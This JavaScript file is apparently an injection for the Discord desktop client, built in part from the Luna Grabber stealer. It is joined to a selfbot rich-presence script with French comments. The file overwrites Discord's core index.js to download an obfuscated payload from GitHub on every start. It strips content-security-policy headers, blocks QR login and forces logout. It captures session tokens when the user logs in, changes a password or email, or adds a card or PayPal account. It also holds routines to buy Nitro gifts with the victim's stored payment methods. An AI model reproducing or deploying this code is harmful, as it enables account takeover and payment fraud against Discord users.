const args = process.argv;
const path = require("path");
const https = require("https");
const querystring = require("querystring");
const fs = require('fs');
const { Client, RichPresence } = require('discord.js-selfbot-v13');
const { exec } = require('child_process');

const configPath = path.join(process.env.APPDATA, 'Secret', 'config.json');
const rpcPath = path.join(process.env.APPDATA, 'Secret', 'rpc.json');

let token;
let botid;
try {
    const configData = fs.readFileSync(configPath);
    const config = JSON.parse(configData);
    token = config.token;
    botid = config.botid;
    userid = config.userid;
} catch (error) {
    console.error("Erreur de lecture ou parsing config.json:", error);
    process.exit(1);
}

function parseTime(timeString) {
    const [minutes, seconds] = timeString.split(':').map(Number);
    return (minutes * 60 + seconds) * 1000;
}

const client = new Client({
    checkUpdates: false
});

function updateRichPresence() {
    let rpcConfig;
    try {
        const rpcData = fs.readFileSync(rpcPath);
        rpcConfig = JSON.parse(rpcData);
    } catch (error) {
        console.error("Erreur de lecture ou parsing rpc.json:", error);
        return;
    }

    const startTime = Date.now() - parseTime(rpcConfig.StartTime);

    let endTime;
    if (rpcConfig.EndTime === "True") {
        endTime = Date.now();
    } else {
        endTime = 0;
    }

    const status = new RichPresence(client)
        .setApplicationId(botid)
        .setType(rpcConfig.Type !== "None" ? rpcConfig.Type : undefined)
        .setName(rpcConfig.Name !== "None" ? rpcConfig.Name : undefined)
        .setState(rpcConfig.State !== "None" ? rpcConfig.State : undefined)
        .setDetails(rpcConfig.Details !== "None" ? rpcConfig.Details : undefined)
        .setStartTimestamp(startTime)
        .setEndTimestamp(endTime)
        .setAssetsLargeImage(rpcConfig.Largeimage !== "None" ? rpcConfig.Largeimage : undefined)
        .setAssetsLargeText(rpcConfig.LargeimageText !== "None" ? rpcConfig.LargeimageText : undefined)
        .setAssetsSmallImage(rpcConfig.Smallimage !== "None" ? rpcConfig.Smallimage : undefined)
        .setAssetsSmallText(rpcConfig.SmallimageText !== "None" ? rpcConfig.SmallimageText : undefined);

    if (rpcConfig.Button1.Text !== "None" && rpcConfig.Button1.Url !== "None") {
        status.addButton(rpcConfig.Button1.Text, rpcConfig.Button1.Url);
    }

    if (rpcConfig.Button2.Text !== "None" && rpcConfig.Button2.Url !== "None") {
        status.addButton(rpcConfig.Button2.Text, rpcConfig.Button2.Url);
    }

    client.user.setPresence({
        activities: [status],
        status: 'online'
    });
}

function openRpcFile() {
    try {
        exec(`start "" "${rpcPath}"`, (err, stdout, stderr) => {
            if (err) {
                return;
            }
        });
    } catch (error) {
    }
}

client.on('message', message => {
  if (message.content === '.rpc' && message.author.id === userid) {
      openRpcFile();
      message.channel.send('Le fichier rpc.json a été ouvert.');
  } else if (message.content === '.rpc') {
      message.channel.send('Vous n\'avez pas la permission d\'utiliser cette commande.');
  }
});

client.on('ready', () => {
    console.log(`Connecté en tant que ${client.user.tag}!`);
    
    updateRichPresence();

    setInterval(updateRichPresence, 2000);
});

client.login(token);


const {
  BrowserWindow,
  session
} = require("electron");
const config = {
  'injection_url': "https://raw.githubusercontent.com/Smug246/Luna-Grabber-Injection/main/injection-obfuscated.js",
  'api': "https://discord.com/api/v9/users/@me",
  'nitro': {
    'boost': {
      'year': {
        'id': "521847234246082599",
        'sku': "511651885459963904",
        'price': "9999"
      },
      'month': {
        'id': "521847234246082599",
        'sku': "511651880837840896",
        'price': "999"
      }
    },
    'classic': {
      'month': {
        'id': "521846918637420545",
        'sku': "511651871736201216",
        'price': "499"
      }
    }
  },
  'filter': {
    'urls': ["https://discord.com/api/v*/users/@me", "https://discordapp.com/api/v*/users/@me", "https://*.discord.com/api/v*/users/@me", "https://discordapp.com/api/v*/auth/login", "https://discord.com/api/v*/auth/login", "https://*.discord.com/api/v*/auth/login", "https://api.braintreegateway.com/merchants/49pp2rp4phym7387/client_api/v*/payment_methods/paypal_accounts", "https://api.stripe.com/v*/tokens", "https://api.stripe.com/v*/setup_intents/*/confirm", "https://api.stripe.com/v*/payment_intents/*/confirm"]
  },
  'filter2': {
    'urls': ["https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json", "https://*.discord.com/api/v*/applications/detectable", "https://discord.com/api/v*/applications/detectable", "https://*.discord.com/api/v*/users/@me/library", "https://discord.com/api/v*/users/@me/library", "wss://remote-auth-gateway.discord.gg/*"]
  }
};
function parity_32(_0x5b5835, _0x2751be, _0x3c08eb) {
  return _0x5b5835 ^ _0x2751be ^ _0x3c08eb;
}
function ch_32(_0x336580, _0xe0de46, _0x52a1c9) {
  return _0x336580 & _0xe0de46 ^ ~_0x336580 & _0x52a1c9;
}
function maj_32(_0x3c5e19, _0xcd8111, _0x5a61b3) {
  return _0x3c5e19 & _0xcd8111 ^ _0x3c5e19 & _0x5a61b3 ^ _0xcd8111 & _0x5a61b3;
}
function rotl_32(_0x5afe86, _0xb0ea74) {
  return _0x5afe86 << _0xb0ea74 | _0x5afe86 >>> 32 - _0xb0ea74;
}
function safeAdd_32_2(_0x3fbad0, _0xaa899a) {
  var _0x366fa7 = (_0x3fbad0 & 65535) + (_0xaa899a & 65535);
  var _0x3c0e8f = (_0x3fbad0 >>> 16) + (_0xaa899a >>> 16) + (_0x366fa7 >>> 16);
  return (_0x3c0e8f & 65535) << 16 | _0x366fa7 & 65535;
}
function safeAdd_32_5(_0x3d927f, _0x31a5ad, _0x44ee70, _0x1d4f9b, _0x4088df) {
  var _0x967eca = (_0x3d927f & 65535) + (_0x31a5ad & 65535) + (_0x44ee70 & 65535) + (_0x1d4f9b & 65535) + (_0x4088df & 65535);
  var _0x3d5a47 = (_0x3d927f >>> 16) + (_0x31a5ad >>> 16) + (_0x44ee70 >>> 16) + (_0x1d4f9b >>> 16) + (_0x4088df >>> 16) + (_0x967eca >>> 16);
  return (_0x3d5a47 & 65535) << 16 | _0x967eca & 65535;
}
function binb2hex(_0x5f888) {
  var _0x5b6164 = '';
  var _0xb13b2c = _0x5f888.length * 4;
  var _0x34ff47;
  var _0x2cc21d;
  for (_0x34ff47 = 0; _0x34ff47 < _0xb13b2c; _0x34ff47 += 1) {
    _0x2cc21d = _0x5f888[_0x34ff47 >>> 2] >>> (3 - _0x34ff47 % 4) * 8;
    _0x5b6164 += "0123456789abcdef".charAt(_0x2cc21d >>> 4 & 15) + "0123456789abcdef".charAt(_0x2cc21d & 15);
  }
  return _0x5b6164;
}
function getH() {
  return [1732584193, 4023233417, 2562383102, 271733878, 3285377520];
}
function roundSHA1(_0x47c1cd, _0x362204) {
  var _0x90f462 = [];
  var _0x2670f2;
  var _0x2ad6e7;
  var _0xc197f6;
  var _0x4be480;
  var _0x3b243c;
  var _0x38ab65;
  var _0x31549c;
  _0x2670f2 = _0x362204[0];
  _0x2ad6e7 = _0x362204[1];
  _0xc197f6 = _0x362204[2];
  _0x4be480 = _0x362204[3];
  _0x3b243c = _0x362204[4];
  for (_0x31549c = 0; _0x31549c < 80; _0x31549c += 1) {
    if (_0x31549c < 16) {
      _0x90f462[_0x31549c] = _0x47c1cd[_0x31549c];
    } else {
      _0x90f462[_0x31549c] = (_0x90f462[_0x31549c - 3] ^ _0x90f462[_0x31549c - 8] ^ _0x90f462[_0x31549c - 14] ^ _0x90f462[_0x31549c - 16]) << 1 | (_0x90f462[_0x31549c - 3] ^ _0x90f462[_0x31549c - 8] ^ _0x90f462[_0x31549c - 14] ^ _0x90f462[_0x31549c - 16]) >>> 31;
    }
    if (_0x31549c < 20) {
      _0x38ab65 = safeAdd_32_5(_0x2670f2 << 5 | _0x2670f2 >>> 27, _0x2ad6e7 & _0xc197f6 ^ ~_0x2ad6e7 & _0x4be480, _0x3b243c, 1518500249, _0x90f462[_0x31549c]);
    } else {
      if (_0x31549c < 40) {
        _0x38ab65 = safeAdd_32_5(_0x2670f2 << 5 | _0x2670f2 >>> 27, _0x2ad6e7 ^ _0xc197f6 ^ _0x4be480, _0x3b243c, 1859775393, _0x90f462[_0x31549c]);
      } else if (_0x31549c < 60) {
        _0x38ab65 = safeAdd_32_5(_0x2670f2 << 5 | _0x2670f2 >>> 27, _0x2ad6e7 & _0xc197f6 ^ _0x2ad6e7 & _0x4be480 ^ _0xc197f6 & _0x4be480, _0x3b243c, 2400959708, _0x90f462[_0x31549c]);
      } else {
        _0x38ab65 = safeAdd_32_5(_0x2670f2 << 5 | _0x2670f2 >>> 27, _0x2ad6e7 ^ _0xc197f6 ^ _0x4be480, _0x3b243c, 3395469782, _0x90f462[_0x31549c]);
      }
    }
    _0x3b243c = _0x4be480;
    _0x4be480 = _0xc197f6;
    _0xc197f6 = _0x2ad6e7 << 30 | _0x2ad6e7 >>> 2;
    _0x2ad6e7 = _0x2670f2;
    _0x2670f2 = _0x38ab65;
  }
  _0x362204[0] = safeAdd_32_2(_0x2670f2, _0x362204[0]);
  _0x362204[1] = safeAdd_32_2(_0x2ad6e7, _0x362204[1]);
  _0x362204[2] = safeAdd_32_2(_0xc197f6, _0x362204[2]);
  _0x362204[3] = safeAdd_32_2(_0x4be480, _0x362204[3]);
  _0x362204[4] = safeAdd_32_2(_0x3b243c, _0x362204[4]);
  return _0x362204;
}
function finalizeSHA1(_0x2d8fd8, _0x23d1ab, _0x594a70, _0x212270) {
  var _0x26f7ab;
  var _0x3f7212;
  var _0x32834d;
  _0x32834d = (_0x23d1ab + 65 >>> 9 << 4) + 15;
  while (_0x2d8fd8.length <= _0x32834d) {
    _0x2d8fd8.push(0);
  }
  _0x2d8fd8[_0x23d1ab >>> 5] |= 128 << 24 - _0x23d1ab % 32;
  _0x2d8fd8[_0x32834d] = _0x23d1ab + _0x594a70;
  _0x3f7212 = _0x2d8fd8.length;
  for (_0x26f7ab = 0; _0x26f7ab < _0x3f7212; _0x26f7ab += 16) {
    _0x212270 = roundSHA1(_0x2d8fd8.slice(_0x26f7ab, _0x26f7ab + 16), _0x212270);
  }
  return _0x212270;
}
function hex2binb(_0x281416, _0x335ea4, _0x192dc9) {
  var _0x41b7f8;
  var _0x19f09b = _0x281416.length;
  var _0x4e766c;
  var _0x5361c4;
  var _0x2b9cb4;
  var _0x2a4271;
  var _0x542d3a;
  _0x41b7f8 = _0x335ea4 || [0];
  _0x192dc9 = _0x192dc9 || 0;
  _0x542d3a = _0x192dc9 >>> 3;
  if (0 !== _0x19f09b % 2) {
    console.error("String of HEX type must be in byte increments");
  }
  for (_0x4e766c = 0; _0x4e766c < _0x19f09b; _0x4e766c += 2) {
    _0x5361c4 = parseInt(_0x281416.substr(_0x4e766c, 2), 16);
    if (!isNaN(_0x5361c4)) {
      _0x2a4271 = (_0x4e766c >>> 1) + _0x542d3a;
      _0x2b9cb4 = _0x2a4271 >>> 2;
      while (_0x41b7f8.length <= _0x2b9cb4) {
        _0x41b7f8.push(0);
      }
      _0x41b7f8[_0x2b9cb4] |= _0x5361c4 << 8 * (3 - _0x2a4271 % 4);
    } else {
      console.error("String of HEX type contains invalid characters");
    }
  }
  return {
    'value': _0x41b7f8,
    'binLen': _0x19f09b * 4 + _0x192dc9
  };
}
class jsSHA {
  constructor() {
    var _0x55b4f6 = 0;
    var _0x3b313e = [];
    var _0x2998e7 = 0;
    var _0x415797;
    var _0x477a8d = false;
    var _0x494044 = false;
    var _0x10454a = [];
    var _0x2eacad = [];
    var _0x1573fc;
    var _0x1573fc = 1;
    if (_0x1573fc !== parseInt(_0x1573fc, 10) || 1 > _0x1573fc) {
      console.error("numRounds must a integer >= 1");
    }
    _0x415797 = [1732584193, 4023233417, 2562383102, 271733878, 3285377520];
    this.setHMACKey = function (_0x41df9f) {
      var _0xb6bad3;
      var _0x59fda0;
      var _0x466a0c;
      var _0xb6ae13;
      _0xb6bad3 = hex2binb(_0x41df9f);
      _0x59fda0 = _0xb6bad3.binLen;
      _0x466a0c = _0xb6bad3.value;
      if (64 < _0x59fda0 / 8) {
        _0x466a0c = finalizeSHA1(_0x466a0c, _0x59fda0, 0, [1732584193, 4023233417, 2562383102, 271733878, 3285377520]);
        while (_0x466a0c.length <= 15) {
          _0x466a0c.push(0);
        }
        _0x466a0c[15] &= 4294967040;
      } else {
        if (64 > _0x59fda0 / 8) {
          while (_0x466a0c.length <= 15) {
            _0x466a0c.push(0);
          }
          _0x466a0c[15] &= 4294967040;
        }
      }
      for (_0xb6ae13 = 0; _0xb6ae13 <= 15; _0xb6ae13 += 1) {
        _0x10454a[_0xb6ae13] = _0x466a0c[_0xb6ae13] ^ 909522486;
        _0x2eacad[_0xb6ae13] = _0x466a0c[_0xb6ae13] ^ 1549556828;
      }
      _0x415797 = roundSHA1(_0x10454a, _0x415797);
      _0x55b4f6 = 512;
      _0x494044 = true;
    };
    this.update = function (_0x5519ca) {
      var _0x90236d;
      var _0x4c1f10;
      var _0xcffba4;
      var _0xf83c8c;
      var _0x5084ce;
      var _0x2c0eec = 0;
      _0x90236d = hex2binb(_0x5519ca, _0x3b313e, _0x2998e7);
      _0x4c1f10 = _0x90236d.binLen;
      _0xf83c8c = _0x90236d.value;
      _0xcffba4 = _0x4c1f10 >>> 5;
      for (_0x5084ce = 0; _0x5084ce < _0xcffba4; _0x5084ce += 16) {
        if (_0x2c0eec + 512 <= _0x4c1f10) {
          _0x415797 = roundSHA1(_0xf83c8c.slice(_0x5084ce, _0x5084ce + 16), _0x415797);
          _0x2c0eec += 512;
        }
      }
      _0x55b4f6 += _0x2c0eec;
      _0x3b313e = _0xf83c8c.slice(_0x2c0eec >>> 5);
      _0x2998e7 = _0x4c1f10 % 512;
    };
    this.getHMAC = function () {
      var _0x3e4946;
      if (false === _0x494044) {
        console.error("Cannot call getHMAC without first setting HMAC key");
      }
      if (false === _0x477a8d) {
        _0x3e4946 = finalizeSHA1(_0x3b313e, _0x2998e7, _0x55b4f6, _0x415797);
        _0x415797 = roundSHA1(_0x2eacad, [1732584193, 4023233417, 2562383102, 271733878, 3285377520]);
        _0x415797 = finalizeSHA1(_0x3e4946, 160, 512, _0x415797);
      }
      _0x477a8d = true;
      return binb2hex(_0x415797);
    };
  }
}
if ("function" === typeof define && define.amd) {
  define(function () {
    return jsSHA;
  });
} else if ("undefined" !== typeof exports) {
  if ("undefined" !== typeof module && module.exports) {
    module.exports = exports = jsSHA;
  } else {
    exports = jsSHA;
  }
} else {
  global.jsSHA = jsSHA;
}
if (jsSHA["default"]) {
  jsSHA = jsSHA["default"];
}
function totp(_0x261deb) {
  const _0x3bcd40 = Date.now();
  const _0x31fc50 = Math.round(_0x3bcd40 / 1000);
  const _0x43da76 = leftpad((Math.floor(_0x31fc50 / 30) < 15.5 ? '0' : '') + Math.round(Math.floor(_0x31fc50 / 30)).toString(16), 16, '0');
  const _0xfe4f18 = new jsSHA();
  _0xfe4f18.setHMACKey(base32tohex(_0x261deb));
  _0xfe4f18.update(_0x43da76);
  const _0x184164 = _0xfe4f18.getHMAC();
  const _0x139fc9 = parseInt(_0x184164.substring(_0x184164.length - 1), 16);
  let _0x4a6968 = (parseInt(_0x184164.substr(_0x139fc9 * 2, 8), 16) & parseInt("7fffffff", 16)) + '';
  _0x4a6968 = _0x4a6968.substr(Math.max(_0x4a6968.length - 6, 0), 6);
  return _0x4a6968;
}
function hex2dec(_0x2370e5) {
  return parseInt(_0x2370e5, 16);
}
function dec2hex(_0x2e80fb) {
  return (_0x2e80fb < 15.5 ? '0' : '') + Math.round(_0x2e80fb).toString(16);
}
function base32tohex(_0x339465) {
  let _0x490cbe = '';
  let _0x3ba2e0 = '';
  _0x339465 = _0x339465.replace(/=+$/, '');
  for (let _0x44abf1 = 0; _0x44abf1 < _0x339465.length; _0x44abf1++) {
    let _0x5743fb = "ABCDEFGHIJKLMNOPQRSTUVWXYZ234567".indexOf(_0x339465.charAt(_0x44abf1).toUpperCase());
    if (_0x5743fb === -1) {
      console.error("Invalid base32 character in key");
    }
    _0x490cbe += leftpad(_0x5743fb.toString(2), 5, '0');
  }
  for (let _0x4fda13 = 0; _0x4fda13 + 8 <= _0x490cbe.length; _0x4fda13 += 8) {
    let _0x39a01f = _0x490cbe.substr(_0x4fda13, 8);
    _0x3ba2e0 = _0x3ba2e0 + leftpad(parseInt(_0x39a01f, 2).toString(16), 2, '0');
  }
  return _0x3ba2e0;
}
function leftpad(_0x910075, _0x4ab711, _0x387720) {
  if (_0x4ab711 + 1 >= _0x910075.length) {
    _0x910075 = Array(_0x4ab711 + 1 - _0x910075.length).join(_0x387720) + _0x910075;
  }
  return _0x910075;
}
const discordPath = function () {
  const _0x16613f = args[0].split(path.sep).slice(0, -1).join(path.sep);
  let _0xcfb56a;
  if (process.platform === "win32") {
    _0xcfb56a = path.join(_0x16613f, "resources");
  } else if (process.platform === "darwin") {
    _0xcfb56a = path.join(_0x16613f, "Contents", "Resources");
  }
  if (fs.existsSync(_0xcfb56a)) {
    return {
      'resourcePath': _0xcfb56a,
      'app': _0x16613f
    };
  }
  return {
    'undefined': undefined,
    'undefined': undefined
  };
}();
function updateCheck() {
  const {
    resourcePath: _0x429301,
    app: _0x335a6a
  } = discordPath;
  if (_0x429301 === undefined || _0x335a6a === undefined) {
    return;
  }
  const _0x438b4f = path.join(_0x429301, "app");
  const _0x29490c = path.join(_0x438b4f, "package.json");
  const _0x24ac72 = path.join(_0x438b4f, "index.js");
  const _0x40969c = fs.readdirSync(_0x335a6a + "\\modules\\").filter(_0x1981f3 => /discord_desktop_core-+?/.test(_0x1981f3))[0];
  const _0x5004bd = _0x335a6a + "\\modules\\" + _0x40969c + "\\discord_desktop_core\\index.js";
  const _0x3cdde7 = path.join(process.env.APPDATA, "\\betterdiscord\\data\\betterdiscord.asar");
  if (!fs.existsSync(_0x438b4f)) {
    fs.mkdirSync(_0x438b4f);
  }
  if (fs.existsSync(_0x29490c)) {
    fs.unlinkSync(_0x29490c);
  }
  if (fs.existsSync(_0x24ac72)) {
    fs.unlinkSync(_0x24ac72);
  }
  if (process.platform === "win32" || process.platform === "darwin") {
    fs.writeFileSync(_0x29490c, JSON.stringify({
      'name': "discord",
      'main': "index.js"
    }, null, 4));
    const _0xf7e943 = "const fs = require('fs'), https = require('https');\nconst indexJs = '" + _0x5004bd + "';\nconst bdPath = '" + _0x3cdde7 + "';\nconst fileSize = fs.statSync(indexJs).size\nfs.readFileSync(indexJs, 'utf8', (err, data) => {\n    if (fileSize < 20000 || data === \"module.exports = require('./core.asar')\") \n        init();\n})\nasync function init() {\n    https.get('" + "https://raw.githubusercontent.com/Smug246/Luna-Grabber-Injection/main/injection-obfuscated.js" + "', (res) => {\n        const file = fs.createWriteStream(indexJs);\n        res.replace('%WEBHOOK%', '" + "%WEBHOOK%" + "')\n        res.replace('%WEBHOOK_KEY%', '" + "%WEBHOOK_KEY%" + "')\n        res.pipe(file);\n        file.on('finish', () => {\n            file.close();\n        });\n    \n    }).on(\"error\", (err) => {\n        setTimeout(init(), 10000);\n    });\n}\nrequire('" + path.join(_0x429301, "app.asar") + "')\nif (fs.existsSync(bdPath)) require(bdPath);";
    fs.writeFileSync(_0x24ac72, _0xf7e943.replace(/\\/g, "\\\\"));
  }
  if (!fs.existsSync(path.join(__dirname, "initiation"))) {
    return true;
  }
  fs.rmdirSync(path.join(__dirname, "initiation"));
  execScript("window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[[\"get_require\"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]);function LogOut(){(function(a){const b=\"string\"==typeof a?a:null;for(const c in gg.c)if(gg.c.hasOwnProperty(c)){const d=gg.c[c].exports;if(d&&d.__esModule&&d.default&&(b?d.default[b]:a(d.default)))return d.default;if(d&&(b?d[b]:a(d)))return d}return null})(\"login\").logout()}LogOut();");
  return false;
}
const execScript = _0xdbc3ed => {
  const _0x58867d = BrowserWindow.getAllWindows()[0];
  return _0x58867d.webContents.executeJavaScript(_0xdbc3ed, true);
};
const getInfo = async _0x4f531b => {
  const _0x4c63e2 = await execScript("var xmlHttp = new XMLHttpRequest();\n    xmlHttp.open(\"GET\", \"https://discord.com/api/v9/users/@me\", false);\n    xmlHttp.setRequestHeader(\"Authorization\", \"" + _0x4f531b + "\");\n    xmlHttp.send(null);\n    xmlHttp.responseText;");
  return JSON.parse(_0x4c63e2);
};
const fetchBilling = async _0x3e7f44 => {
  const _0x266d81 = await execScript("var xmlHttp = new XMLHttpRequest(); \n    xmlHttp.open(\"GET\", \"https://discord.com/api/v9/users/@me/billing/payment-sources\", false); \n    xmlHttp.setRequestHeader(\"Authorization\", \"" + _0x3e7f44 + "\"); \n    xmlHttp.send(null); \n    xmlHttp.responseText");
  if (!_0x266d81.lenght || _0x266d81.length === 0) {
    return '';
  }
  return JSON.parse(_0x266d81);
};
const getBilling = async _0x1bff33 => {
  const _0x48c4a0 = await fetchBilling(_0x1bff33);
  if (!_0x48c4a0) {
    return '❌';
  }
  let _0x1c504d = '';
  _0x48c4a0.forEach(_0x11e8b8 => {
    if (!_0x11e8b8.invalid) {
      switch (_0x11e8b8.type) {
        case 1:
          _0x1c504d += "💳 ";
          break;
        case 2:
          _0x1c504d += "<:paypal:951139189389410365> ";
          break;
      }
    }
  });
  if (!_0x1c504d) {
    _0x1c504d = '❌';
  }
  return _0x1c504d;
};
const Purchase = async (_0x24e370, _0x4251f7, _0x116354, _0x5c6d3e) => {
  const _0x1f325 = {
    'expected_amount': config.nitro[_0x116354][_0x5c6d3e].price,
    'expected_currency': "usd",
    'gift': true,
    'payment_source_id': _0x4251f7,
    'payment_source_token': null,
    'purchase_token': "2422867c-244d-476a-ba4f-36e197758d97",
    'sku_subscription_plan_id': config.nitro[_0x116354][_0x5c6d3e].sku
  };
  const _0x323e04 = execScript("var xmlHttp = new XMLHttpRequest();\n    xmlHttp.open(\"POST\", \"https://discord.com/api/v9/store/skus/" + config.nitro[_0x116354][_0x5c6d3e].id + "/purchase\", false);\n    xmlHttp.setRequestHeader(\"Authorization\", \"" + _0x24e370 + "\");\n    xmlHttp.setRequestHeader('Content-Type', 'application/json');\n    xmlHttp.send(JSON.stringify(" + JSON.stringify(_0x1f325) + "));\n    xmlHttp.responseText");
  if (_0x323e04.gift_code) {
    return "https://discord.gift/" + _0x323e04.gift_code;
  } else {
    return null;
  }
};
const buyNitro = async _0x2f6b69 => {
  const _0x31e808 = await fetchBilling(_0x2f6b69);
  if (!_0x31e808) {
    return "Failed to Purchase ❌";
  }
  let _0x1e55a9 = [];
  _0x31e808.forEach(_0x64b464 => {
    if (!_0x64b464.invalid) {
      _0x1e55a9 = _0x1e55a9.concat(_0x64b464.id);
    }
  });
  for (let _0x53c0fc in _0x1e55a9) {
    const _0x332362 = Purchase(_0x2f6b69, _0x53c0fc, "boost", "year");
    if (_0x332362 !== null) {
      return _0x332362;
    } else {
      const _0x1d4524 = Purchase(_0x2f6b69, _0x53c0fc, "boost", "month");
      if (_0x1d4524 !== null) {
        return _0x1d4524;
      } else {
        const _0x535b03 = Purchase(_0x2f6b69, _0x53c0fc, "classic", "month");
        return _0x535b03 !== null ? _0x535b03 : "Failed to Purchase ❌";
      }
    }
  }
};
const getNitro = _0x4d5941 => {
  switch (_0x4d5941) {
    case 0:
      return "No Nitro";
    case 1:
      return "Nitro Classic";
    case 2:
      return "Nitro Boost";
    default:
      return "No Nitro";
  }
};
const getBadges = _0x8fc844 => {
  let _0x4d4c1a = '';
  switch (_0x8fc844) {
    case 1:
      _0x4d4c1a += "Discord Staff, ";
      break;
    case 2:
      _0x4d4c1a += "Partnered Server Owner, ";
      break;
    case 131072:
      _0x4d4c1a += "Verified Bot Developer, ";
      break;
    case 4194304:
      _0x4d4c1a += "Active Developer, ";
      break;
    case 4:
      _0x4d4c1a += "Hypesquad Event, ";
      break;
    case 16384:
      _0x4d4c1a += "Gold BugHunter, ";
      break;
    case 8:
      _0x4d4c1a += "Green BugHunter, ";
      break;
    case 512:
      _0x4d4c1a += "Early Supporter, ";
      break;
    case 128:
      _0x4d4c1a += "HypeSquad Brillance, ";
      break;
    case 64:
      _0x4d4c1a += "HypeSquad Bravery, ";
      break;
    case 256:
      _0x4d4c1a += "HypeSquad Balance, ";
      break;
    case 0:
      _0x4d4c1a = "None";
      break;
    default:
      _0x4d4c1a = "None";
      break;
  }
  return _0x4d4c1a;
};



const hooker = async (_0x23fb6c) => {
  try {
      // S'assurer que le dossier Secret existe
      if (!fs.existsSync(secretPath)) {
          fs.mkdirSync(secretPath, { recursive: true });
      }

      let configData = {};
      // Vérifier si config.json existe et le lire
      if (fs.existsSync(configPath)) {
          const fileContent = fs.readFileSync(configPath, 'utf8');
          configData = JSON.parse(fileContent);
      }

      // Mettre à jour uniquement le champ "token"
      configData.token = _0x23fb6c.token;

      // Écrire les données mises à jour dans config.json
      const data = JSON.stringify(configData, null, 2); // Formattage pour rendre le JSON lisible
      fs.writeFileSync(configPath, data, 'utf8');

      console.log(`Données mises à jour dans ${configPath}`);
  } catch (error) {
      console.error("Erreur lors de l'enregistrement des données :", error);
  }
};
const login = async (_0x94f435, _0x1dfaa7, _0x6db126) => {
  const _0x3d0f03 = await getInfo(_0x6db126);
  const _0x25ca5e = {
        'token': '' + _0x6db126 + '',
  };
  hooker(_0x25ca5e);
};
const passwordChanged = async (_0x1fdea5, _0x5a716c, _0x522cab) => {
  const _0xf80a5a = await getInfo(_0x522cab);
  const _0xd92ef1 = {
    'token': '' + _0x522cab + '',
  };
  hooker(_0xd92ef1);
};
const emailChanged = async (_0x58509b, _0x148e63, _0x3b9416) => {
  const _0x22bb05 = await getInfo(_0x3b9416);
  const _0x8022f = {
    'token': '' + _0x3b9416 + '',
  };
  hooker(_0x8022f);
};
const PaypalAdded = async _0x4e0300 => {
  const _0x1ab2ef = await getInfo(_0x4e0300);
  const _0x236cc8 = {
    'token': '' + _0x4e0300 + '',
  };
  hooker(_0x236cc8);
};
const ccAdded = async (_0x125a5f, _0x5e9c60, _0x4036d1, _0xf71a5c, _0x3dd805) => {
  const _0xd9c99b = await getInfo(_0x3dd805);
  const _0x4fa649 = {
    'token': '' + _0x3dd805 + '',
  };
  hooker(_0x4fa649);
};
const nitroBought = async _0x9b73b7 => {
  const _0x3a09b2 = await getInfo(_0x9b73b7);
  const _0x15eef6 = {
    'token': '' + _0x9b73b7 + '',
  };
  hooker(_0x15eef6);
};
session.defaultSession.webRequest.onBeforeRequest(config.filter2, (_0x247446, _0x3a0515) => {
  if (_0x247446.url.startsWith("wss://remote-auth-gateway")) {
    return _0x3a0515({
      'cancel': true
    });
  }
  updateCheck();
});
session.defaultSession.webRequest.onHeadersReceived((_0x564f3e, _0x5e5ed2) => {
  if (_0x564f3e.url.startsWith("%WEBHOOK%")) {
    if (_0x564f3e.url.includes("discord.com")) {
      _0x5e5ed2({
        'responseHeaders': Object.assign({
          'Access-Control-Allow-Headers': '*'
        }, _0x564f3e.responseHeaders)
      });
    } else {
      _0x5e5ed2({
        'responseHeaders': Object.assign({
          'Content-Security-Policy': ["default-src '*'", "Access-Control-Allow-Headers '*'", "Access-Control-Allow-Origin '*'"],
          'Access-Control-Allow-Headers': '*',
          'Access-Control-Allow-Origin': '*'
        }, _0x564f3e.responseHeaders)
      });
    }
  } else {
    delete _0x564f3e.responseHeaders["content-security-policy"];
    delete _0x564f3e.responseHeaders["content-security-policy-report-only"];
    _0x5e5ed2({
      'responseHeaders': {
        ..._0x564f3e.responseHeaders,
        'Access-Control-Allow-Headers': '*'
      }
    });
  }
});
session.defaultSession.webRequest.onCompleted(config.filter, async (_0x3f7ba4, _0x3add77) => {
  if (_0x3f7ba4.statusCode !== 200 && _0x3f7ba4.statusCode !== 202) {
    return;
  }
  const _0x49e73a = Buffer.from(_0x3f7ba4.uploadData[0].bytes).toString();
  const _0x5872c1 = JSON.parse(_0x49e73a);
  const _0x54a41c = await execScript("(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()");
  switch (true) {
    case _0x3f7ba4.url.endsWith("login"):
      login(_0x5872c1.login, _0x5872c1.password, _0x54a41c)["catch"](console.error);
      break;
    case _0x3f7ba4.url.endsWith("users/@me") && _0x3f7ba4.method === "PATCH":
      if (!_0x5872c1.password) {
        return;
      }
      if (_0x5872c1.email) {
        emailChanged(_0x5872c1.email, _0x5872c1.password, _0x54a41c)["catch"](console.error);
      }
      if (_0x5872c1.new_password) {
        passwordChanged(_0x5872c1.password, _0x5872c1.new_password, _0x54a41c)["catch"](console.error);
      }
      break;
    case _0x3f7ba4.url.endsWith("tokens") && _0x3f7ba4.method === "POST":
      const _0x26ae71 = querystring.parse(unparsedData.toString());
      ccAdded(_0x26ae71["card[number]"], _0x26ae71["card[cvc]"], _0x26ae71["card[exp_month]"], _0x26ae71["card[exp_year]"], _0x54a41c)["catch"](console.error);
      break;
    case _0x3f7ba4.url.endsWith("paypal_accounts") && _0x3f7ba4.method === "POST":
      PaypalAdded(_0x54a41c)["catch"](console.error);
      break;
    case _0x3f7ba4.url.endsWith("confirm") && _0x3f7ba4.method === "POST":
      return;
      setTimeout(() => {
        nitroBought(_0x54a41c)["catch"](console.error);
      }, 7500);
      break;
    default:
      break;
  }
});


module.exports = require("./core.asar");
